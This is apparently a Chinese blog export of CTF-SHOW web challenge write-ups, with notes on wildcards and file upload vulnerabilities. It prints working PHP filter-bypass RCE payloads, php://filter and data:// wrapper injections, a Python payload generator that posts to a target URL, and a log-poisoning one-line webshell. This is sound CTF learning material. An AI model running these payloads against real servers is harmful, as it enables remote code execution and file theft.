<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[a]);&amp;a=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat flag.php&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>这个payload共传递了两个参数，第一个为嵌套eval，第二个为嵌套eval的传入参数</p>
<ol start="2">
<li><h5 id="其他函数凑出所需要的字符串来绕过（盐都不盐了）"><a href="#其他函数凑出所需要的字符串来绕过（盐都不盐了）" class="headerlink" title="其他函数凑出所需要的字符串来绕过（盐都不盐了）"></a>其他函数凑出所需要的字符串来绕过（盐都不盐了）</h5></li>
</ol>
<p>其实这个是rce</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">localeconv</span>()：返回包含本地化数字和货币格式信息的关联数组。这里主要是返回数组第一个<span class="string">&quot;.&quot;</span></span><br><span class="line"><span class="title function_ invoke__">pos</span>():输出数组第一个元素，不改变指针；</span><br><span class="line"><span class="title function_ invoke__">scandir</span>();遍历目录，这里因为参数为<span class="string">&quot;.&quot;</span>所以遍历当前目录</span><br><span class="line"><span class="title function_ invoke__">array_reverse</span>():元组倒置</span><br><span class="line"><span class="title function_ invoke__">next</span>():将数组指针指向下一个，这里其实可以省略倒置和改变数组指针，直接利用[<span class="number">2</span>]取出数组也可以</span><br><span class="line"><span class="title function_ invoke__">show_source</span>():查看源码</span><br></pre></td></tr></table></figure>



<h2 id="Web32"><a href="#Web32" class="headerlink" title="Web32"></a>Web32</h2><h3 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过滤：<code>flag</code>，<code>system</code>，<code>php</code>，<code>cat</code>，<code>sort</code>，<code>shell</code>，<code>.</code> ，<code>‘</code> ，`  ，<code>echo</code>，；，(</p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>参照sdellone的wp，进行了改进和解释</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="keyword">include</span>%<span class="number">0</span>a<span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php #这是sdellone的payload</span></span><br><span class="line"></span><br><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php #这是我的payload</span></span><br></pre></td></tr></table></figure>

<p>其实两者的差距只在于一个%0a，改不改无所谓，下面解释各成分作用</p>
<ul>
<li>首先是include+参数1，作用是包含参数1的文件，运用了文件包含漏洞，最后的文件名字可以改为&#x2F;etc&#x2F;passwd和nginx的日志文件来定位flag位置</li>
<li>然后是%0a作用，这是url回车符，因为空格被过滤。事实上，删去也无所谓，似乎php会自动给字符串和变量间添加空格（经检验，只在eval中有效，echo中无效，还是得要空格）</li>
<li>后面的?&gt;的作用是作为绕过分号，作为语句的结束。原理是：php遇到定界符关闭标签会自动在末尾加上一个分号。简单来说，就是php文件中最后一句在?&gt;前可以不写分号。</li>
<li>在c中引用了参数1，然后&amp;后对参数1定义，运用文件包含漏洞</li>
</ul>
<p> 还可以使用<strong>data伪协议</strong>，<strong>日志注入</strong></p>
<h2 id="Web33"><a href="#Web33" class="headerlink" title="Web33"></a>Web33</h2><p>比起上道题多过滤了 <code>“</code></p>
<p>使用文件包含漏洞一样的</p>
<h2 id="Web34"><a href="#Web34" class="headerlink" title="Web34"></a>Web34</h2><p>比起上道题多过滤了 <code>:</code></p>
<p>检查的内容只有<code>c</code>，而<code>c</code>在<code>?&gt;</code>已经闭合了，不影响后续的<code>1</code></p>
<h2 id="Web35"><a href="#Web35" class="headerlink" title="Web35"></a>Web35</h2><p>比起上道题多过滤了 <code>&lt;</code>, <code>=</code></p>
<p>还是一样的</p>
<h2 id="Web36"><a href="#Web36" class="headerlink" title="Web36"></a>Web36</h2><p>比起上到题多过滤了<code>/</code>，<code>[0-9]</code></p>
<p>那需要修改一下传入的文件名</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[a]?%<span class="number">3</span>E&amp;a=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>



<h2 id="Web37"><a href="#Web37" class="headerlink" title="Web37"></a>Web37</h2><h3 id="题目-4"><a href="#题目-4" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>这里不再是<code>eval</code>而是<code>include</code>了</p>
<p>下方打印了<code>flag</code>，所以<code>c</code>中必需包含<code>flag.txt</code>的内容</p>
<p>这里需要用到<code>data伪协议</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=data:<span class="comment">//text/plain,&lt;?php system(&quot;tac flag.php&quot;)?&gt;</span></span><br><span class="line"><span class="comment">#忘了这里对flag过滤进行绕过了，实则可以使用base64加密或者通配符</span></span><br><span class="line">?c=data:<span class="comment">//text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=</span></span><br></pre></td></tr></table></figure>



<h2 id="Web38"><a href="#Web38" class="headerlink" title="Web38"></a>Web38</h2><h3 id="题目-5"><a href="#题目-5" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure>

<p>比起上题多过滤了<code>php</code>和<code>file</code></p>
<p>一样的，用data伪协议和base64加密即可</p>
<h2 id="Web39"><a href="#Web39" class="headerlink" title="Web39"></a>Web39</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p>这次在后面拼接上了<code>.php</code></p>
<blockquote>
<p><code>.</code>是php的字符串拼接符</p>
</blockquote>
<p>但其实这个拼接没有任何作用</p>
<p>先让我们来看看答案</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?= system(&#x27;tac fla*&#x27;);?&gt;</span><br></pre></td></tr></table></figure>

<p>可以看到已经使用?&gt;进行闭合了，那么php代码已经执行完毕并结束了。</p>
<p>强制给include添加后缀无法阻止伪协议内的php代码执行，只会在代码执行后报错</p>
<h2 id="Web40"><a href="#Web40" class="headerlink" title="Web40"></a>Web40</h2><h3 id="题目-6"><a href="#题目-6" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里把数字和几乎所有符号都过滤了，但是括号是中文括号，阴得没边了</p>
<h3 id="做题思路"><a href="#做题思路" class="headerlink" title="做题思路"></a>做题思路</h3><ol>
<li>得到当前目录</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">getcwd</span>());</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>访问目录下文件</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>()));</span><br></pre></td></tr></table></figure>

<p>得到flag在目录下第三个文件中（倒数第二个）<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250312150246343.png" alt="image-20250312150246343" style="zoom:67%;"></p>
<p>为了减少next的使用</p>
<blockquote>
<p>数组移动操作</p>
<p>end() ： 将内部指针指向数组中的最后一个元素，并输出<br>next() ：将内部指针指向数组中的下一个元素，并输出<br>prev() ：将内部指针指向数组中的上一个元素，并输出<br>reset() ： 将内部指针指向数组中的第一个元素，并输出<br>each() ： 返回当前元素的键名和键值，并将内部指针向前移动</p>
</blockquote>
<p>所以倒置一下目录</p>
<ol start="3">
<li>倒置目录</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>())));</span><br></pre></td></tr></table></figure>

<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250312151309809.png" alt="image-20250312151309809" style="zoom:50%;">

<ol start="4">
<li>数组指针后移</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>()))));</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>读取flag.php</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>())))));</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250312153231369.png" alt="image-20250312153231369"></p>
<h2 id="Web41"><a href="#Web41" class="headerlink" title="Web41"></a>Web41</h2><h3 id="题目-7"><a href="#题目-7" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>比起上道题，这道题过滤掉了所有字母，而且注意使用的是POST传参</p>
<p>可以看到还剩下一个 | 没有被过滤</p>
<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">contents = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        hex_i = <span class="string">&#x27;&#123;:02x&#125;&#x27;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">        hex_j = <span class="string">&#x27;&#123;:02x&#125;&#x27;</span>.<span class="built_in">format</span>(j)</span><br><span class="line">        preg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;[0-9]|[a-z]|\^|\+|~|\$|\[|]|\&#123;|&#125;|&amp;|-&#x27;</span>, re.I)</span><br><span class="line">        <span class="keyword">if</span> preg.search(<span class="built_in">chr</span>(<span class="built_in">int</span>(hex_i, <span class="number">16</span>))) <span class="keyword">or</span> preg.search(<span class="built_in">chr</span>(<span class="built_in">int</span>(hex_j, <span class="number">16</span>))):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            a = <span class="string">&#x27;%&#x27;</span> + hex_i</span><br><span class="line">            b = <span class="string">&#x27;%&#x27;</span> + hex_j</span><br><span class="line">            c = <span class="built_in">chr</span>(<span class="built_in">int</span>(a[<span class="number">1</span>:], <span class="number">16</span>) | <span class="built_in">int</span>(b[<span class="number">1</span>:], <span class="number">16</span>))</span><br><span class="line">            <span class="keyword">if</span> <span class="number">32</span> &lt;= <span class="built_in">ord</span>(c) &lt;= <span class="number">126</span>:</span><br><span class="line">                contents.append([c, a, b])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_payload</span>(<span class="params">cmd</span>):</span><br><span class="line">    payload1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    payload2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cmd:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> contents:</span><br><span class="line">            <span class="keyword">if</span> i == j[<span class="number">0</span>]:</span><br><span class="line">                payload1 += j[<span class="number">1</span>]</span><br><span class="line">                payload2 += j[<span class="number">2</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    payload = <span class="string">&#x27;(&quot;&#x27;</span> + payload1 + <span class="string">&#x27;&quot;|&quot;&#x27;</span> + payload2 + <span class="string">&#x27;&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">URL = <span class="built_in">input</span>(<span class="string">&#x27;url:&#x27;</span>)</span><br><span class="line">payload = make_payload(<span class="string">&#x27;system&#x27;</span>) + make_payload(<span class="string">&#x27;cat flag.php&#x27;</span>)</span><br><span class="line">response = requests.post(URL, data=&#123;<span class="string">&#x27;c&#x27;</span>: urllib.parse.unquote(payload)&#125;)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>计算机</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-SHOW刷题总结Web3</title>
    <url>/2025/03/18/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="GET传参-eval执行"><a href="#GET传参-eval执行" class="headerlink" title="GET传参 eval执行"></a>GET传参 eval执行</h1><h3 id="使用通配符绕过"><a href="#使用通配符绕过" class="headerlink" title="使用通配符绕过"></a>使用通配符绕过</h3><p>前提是题目过滤的字符不多。直接使用system函数（或其他）执行命令，文件名使用通配符模糊搜索即可</p>
<p>若过滤了system， 还可用反字节符配合echo。如echo `cat fla*`;</p>
<h3 id="使用eval嵌套"><a href="#使用eval嵌套" class="headerlink" title="使用eval嵌套"></a>使用eval嵌套</h3><p>题目过滤了主要函数（cat， system），并且过滤了字符 <code>.</code></p>
<p>这里需要使用到的字符有_  、[] 和 $</p>
<h3 id="使用文件包含漏洞"><a href="#使用文件包含漏洞" class="headerlink" title="使用文件包含漏洞"></a>使用文件包含漏洞</h3><p>题目过滤了主要函数，并且过滤了符号 <code>.</code>  <code>&#39;</code>  ` <code>;</code>  <code>(</code>  <code>”</code>  <code>:</code> <code>&lt;</code> <code>=</code> <code>/</code>  和所有的数字</p>
<p>首先将需要传入的参数c设置为include语句，再在include的文件中使用php协议读取内容。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=include$_GET[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<p>这里使用了?&gt;绕过 ;   </p>
<p>也可以用data伪协议和日志注入</p>
<h3 id="使用RCE绕过"><a href="#使用RCE绕过" class="headerlink" title="使用RCE绕过"></a>使用RCE绕过</h3><p>见下</p>
<h1 id="GET传参-include执行"><a href="#GET传参-include执行" class="headerlink" title="GET传参 include执行"></a>GET传参 include执行</h1><h3 id="使用data伪协议"><a href="#使用data伪协议" class="headerlink" title="使用data伪协议"></a>使用data伪协议</h3><p>base64加密可以绕过flag，php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=</span><br></pre></td></tr></table></figure>

<blockquote>
<p>[!NOTE]</p>
<p>include中的拼接符没有任何作用。因为include中的文件在?&gt;就已经进行闭合了，后续的任何代码都不会再执行了，只会报错</p>
</blockquote>
<h3 id="使用RCE绕过-1"><a href="#使用RCE绕过-1" class="headerlink" title="使用RCE绕过"></a>使用RCE绕过</h3><p>过滤掉了除了 <code>()</code>  和 <code>;</code>以外所有符号，以及所有数字</p>
<p>详见另一个笔记</p>
<h1 id="POST传参-eval执行"><a href="#POST传参-eval执行" class="headerlink" title="POST传参 eval执行"></a>POST传参 eval执行</h1>]]></content>
      <categories>
        <category>计算机</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>通配符和正则表达式</title>
    <url>/2025/03/18/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E9%80%9A%E9%85%8D%E7%AC%A6%E4%B8%8E%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="通配符与正则表达式"><a href="#通配符与正则表达式" class="headerlink" title="通配符与正则表达式"></a>通配符与正则表达式</h1><h2 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h2><p>通配符是一种特殊语句，用来模糊搜索文件。</p>
<p>其中某一个字符称为元字符</p>
<h3 id><a href="#" class="headerlink" title="*"></a>*</h3><p>可以替代0个或多个字符</p>
<p>星号表示匹配的数量不受限制</p>
<h3 id="-1"><a href="#-1" class="headerlink" title="?"></a>?</h3><p>可以使用问号替代0个或一个字符</p>
<p>问号表示匹配字符数受到限制</p>
<table>
<thead>
<tr>
<th align="left">元字符</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left">*</td>
<td align="left">前一个字符匹配0次或任意多次</td>
</tr>
<tr>
<td align="left">.</td>
<td align="left">匹配除了换行符以外任意一个字符</td>
</tr>
<tr>
<td align="left">^</td>
<td align="left">匹配行首。例如：^helloworld会匹配以helloworld开头的行</td>
</tr>
<tr>
<td align="left">$</td>
<td align="left">匹配行尾。例如：helloworld$会匹配以helloworld结尾的行</td>
</tr>
<tr>
<td align="left">[]</td>
<td align="left">匹配中括号里的任意指定的一个字符，但只匹配一个字符</td>
</tr>
<tr>
<td align="left">[^]</td>
<td align="left">匹配除中括号以外的任意一个字符</td>
</tr>
<tr>
<td align="left">\</td>
<td align="left">转义符，取消特殊含义</td>
</tr>
<tr>
<td align="left">{n}</td>
<td align="left">表示其前面的字符恰好出现n次</td>
</tr>
<tr>
<td align="left">{n,}</td>
<td align="left">表示其前面的字符出现不小于n次</td>
</tr>
<tr>
<td align="left">{n,m}</td>
<td align="left">表示其前面的字符至少出现n次，最多出现m次</td>
</tr>
</tbody></table>
<h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><p>正则表达式又称为规则表达式，用来检索、替换哪些符合某个模式（规则）的文本</p>
]]></content>
      <categories>
        <category>计算机</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传漏洞</title>
    <url>/2025/03/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的额能力。这种攻击方式是最为直接和有效的。“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理，解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。</p>
<h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><ol>
<li>上传文件时Web语言脚本，服务器的Web容器解释并执行了用户上传的脚本，导致代码执行</li>
<li>上传文件是病毒或者木马时，主要用于诱骗用户或者管理员下载执行或者直接自动运行</li>
<li>.上传文件是Flash的策略文件crossdomain.xml，黑客用以控制Flash在该域下的行为(其他通过类似方式控制策略文件的情况类似);</li>
<li>上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行。</li>
<li>上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈。</li>
</ol>
<p> 除此之外，还有一些不常见的利用方法，比如将上传文件作为一个入口，溢出服务器的后台处理程序，如图片解析模块;或者上传一个合法的文本文件，其内容包含了PHP脚本，再通过”本地文件包含漏洞(Local File Include)”执行此脚本;等等。</p>
<h2 id="满足条件"><a href="#满足条件" class="headerlink" title="满足条件"></a>满足条件</h2><ul>
<li>上传的文件能够被Web容器解释执行。所以文件上传后的目录要是Web容器所覆盖到的路径</li>
<li>用户能够从Web上访问这个文件。</li>
<li>用户上传的文件要能绕过安全检查、格式化、图片压缩等等</li>
</ul>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>大部分的网站和应用系统都有上传功能，一些文件上传功能实现代码没有严格限制用户上传的文件后缀以及文件类型，导致允许攻击者向某个可通过Web访问的目录上传任意PHP文件，并能够将这些文件传递给PHP解释器，就可以在远程服务器上执行任意PHP脚本。</p>
<p> 当系统存在文件上传漏洞时攻击者可以将病毒，木马，WebShell，其他恶意脚本或者是包含了脚本的图片上传到服务器，这些文件将对攻击者后续攻击提供便利。根据具体漏洞的差异，此处上传的脚本可以是正常后缀的PHP，ASP以及JSP脚本，也可以是篡改后缀后的这几类脚本。</p>
]]></content>
      <categories>
        <category>计算机</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-SHOW刷题记录Web4</title>
    <url>/2025/03/18/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="CTF-SHOW"><a href="#CTF-SHOW" class="headerlink" title="CTF SHOW"></a>CTF SHOW</h1><blockquote>
<p>web 78-117</p>
</blockquote>
<h2 id="Web78"><a href="#Web78" class="headerlink" title="Web78"></a>Web78</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line">#不推荐，不知道flag在哪里的时候不好用</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?php system(&#x27;ls&#x27;);?&gt;</span><br><span class="line">?file=data://text/plain,&lt;?php system(&#x27;ls&#x27;);?&gt;</span><br><span class="line">#推荐，可以使用ls命令查看flag位置</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=../../../../var/log/nginx/access.log</span><br><span class="line">&lt;?php eval($_POST[a]); ?&gt;</span><br><span class="line">#日志包含</span><br></pre></td></tr></table></figure>

<p>不解释</p>
